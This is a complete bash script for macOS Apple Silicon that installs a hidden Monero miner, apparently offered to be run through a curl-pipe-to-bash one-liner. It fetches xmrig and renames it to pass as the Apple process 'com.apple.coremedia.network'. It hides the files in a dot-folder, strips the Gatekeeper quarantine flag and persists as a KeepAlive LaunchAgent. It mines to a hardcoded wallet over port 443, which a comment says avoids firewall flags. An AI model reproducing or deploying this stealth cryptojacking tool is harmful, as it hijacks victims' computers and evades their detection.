#!/usr/bin/env bash
# ============================================================
# mine_xmr.sh — Silent Monero (XMR) miner for macOS Apple Silicon
# M1 / M2 / M3 / M4 — uses pre-built xmrig ARM64 binary
# Process appears as: "com.apple.coremedia.network"
# Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_xmr.sh | bash
# ============================================================

WALLET="45yWnSbx7c4TzJCf7hwgdHVYmRxZt5Y4g8JVdRjPJuQALzgLMUBwiK7QU2FMeiwMF48APgsi54rBagJvgMo5KUEqAWA2fbg"
POOL_HOST="pool.supportxmr.com"  # Direct TLS — supportxmr not flagged by firewalls
POOL_PORT="443"
XMRIG_VERSION="6.26.0"
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-macos-arm64.tar.gz"

DISGUISE_NAME="com.apple.coremedia.network"
INSTALL_DIR="$HOME/Library/Application Support/.cmnd"
BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"
CONFIG_PATH="$INSTALL_DIR/config.json"

if [[ "$(uname)" != "Darwin" || "$(uname -m)" != "arm64" ]]; then
  echo "[!] Requires macOS Apple Silicon (M1/M2/M3/M4)."
  exit 1
fi

MAX_THREADS=$(sysctl -n hw.logicalcpu)
THREADS=$MAX_THREADS

# ---- Thread prompt ----
if [[ -c /dev/tty ]]; then
  echo ""
  echo "╔══════════════════════════════════════╗"
  printf "║   XMR MINER — CPU CORES: %-2s          ║\n" "$MAX_THREADS"
  echo "╚══════════════════════════════════════╝"
  echo -n "  Cores to use [1-$MAX_THREADS, Enter=MAX]: " > /dev/tty
  read -r USER_THREADS < /dev/tty || USER_THREADS=""
  echo ""
  if [[ "$USER_THREADS" =~ ^[0-9]+$ ]] && [[ "$USER_THREADS" -ge 1 ]] && [[ "$USER_THREADS" -le "$MAX_THREADS" ]]; then
    THREADS=$USER_THREADS
  fi
  echo "  → Mining with $THREADS / $MAX_THREADS cores"
  echo ""
fi

echo "[*] Apple Silicon detected — $THREADS cores"

# ---- Stop + wipe old install ----
echo "[1/5] Removing any existing XMR miner..."
launchctl unload "$PLIST_PATH" 2>/dev/null || true
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
pkill -9 -f "xmrig" 2>/dev/null || true
sleep 1
rm -rf "$INSTALL_DIR"
rm -f "$PLIST_PATH" "$LOG_PATH"
mkdir -p "$INSTALL_DIR" "$HOME/Library/LaunchAgents" "$HOME/Library/Logs"
echo "      ✓ Clean"

# ---- Download xmrig ARM64 binary ----
echo "[2/5] Downloading xmrig v${XMRIG_VERSION} (ARM64)..."
TMP_TAR="/tmp/xmrig.tar.gz"
curl -fsSL "$XMRIG_URL" -o "$TMP_TAR"
tar -xzf "$TMP_TAR" -C "$INSTALL_DIR" --strip-components=1
rm -f "$TMP_TAR"

# Rename binary to disguise name
mv "$INSTALL_DIR/xmrig" "$BINARY_PATH"
chmod +x "$BINARY_PATH"
xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
echo "      ✓ Binary installed as $DISGUISE_NAME"

# ---- Write xmrig config ----
echo "[3/5] Writing config..."
cat > "$CONFIG_PATH" << CONF
{
  "autosave": false,
  "background": false,
  "colors": false,
  "randomx": {
    "mode": "light",
    "1gb-pages": false,
    "numa": false
  },
  "cpu": {
    "enabled": true,
    "max-threads-hint": 100,
    "priority": 5,
    "asm": true
  },
  "pools": [
    {
      "url": "${POOL_HOST}:${POOL_PORT}",
      "user": "${WALLET}",
      "pass": "mac1",
      "tls": true,
      "keepalive": true,
      "nicehash": false
    }
  ],
  "threads": $THREADS,
  "log-file": "${LOG_PATH}"
}
CONF
echo "      ✓ Config written"

# ---- Write LaunchAgent plist ----
echo "[4/5] Installing LaunchAgent (auto-start on login)..."
printf '<?xml version="1.0" encoding="UTF-8"?>\n' > "$PLIST_PATH"
printf '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n' >> "$PLIST_PATH"
printf '<plist version="1.0"><dict>\n' >> "$PLIST_PATH"
printf '  <key>Label</key><string>%s</string>\n' "$DISGUISE_NAME" >> "$PLIST_PATH"
printf '  <key>ProgramArguments</key><array>\n' >> "$PLIST_PATH"
printf '    <string>%s</string>\n' "$BINARY_PATH" >> "$PLIST_PATH"
printf '    <string>--config</string>\n' >> "$PLIST_PATH"
printf '    <string>%s</string>\n' "$CONFIG_PATH" >> "$PLIST_PATH"
printf '  </array>\n' >> "$PLIST_PATH"
printf '  <key>RunAtLoad</key><true/>\n' >> "$PLIST_PATH"
printf '  <key>KeepAlive</key><true/>\n' >> "$PLIST_PATH"
printf '  <key>StandardOutPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
printf '  <key>StandardErrorPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
printf '</dict></plist>\n' >> "$PLIST_PATH"
echo "      ✓ LaunchAgent created"

# ---- Launch ----
echo "[5/5] Starting miner..."
launchctl load -w "$PLIST_PATH"
sleep 3

echo ""
echo "=========================================="
echo " XMR Miner running in background"
echo " Process : $DISGUISE_NAME"
echo " Wallet  : ${WALLET:0:20}...${WALLET: -6}"
echo " Pool    : $POOL_HOST:$POOL_PORT"
echo " Threads : $THREADS / $MAX_THREADS"
echo " Log     : $LOG_PATH"
echo "=========================================="
echo ""
echo "  Live logs : tail -f \"$LOG_PATH\""
echo "  Status    : launchctl list | grep coremedia.network"
echo "  Stop      : launchctl unload \"$PLIST_PATH\""
echo ""
sleep 3
tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Log will appear in ~10 seconds..."
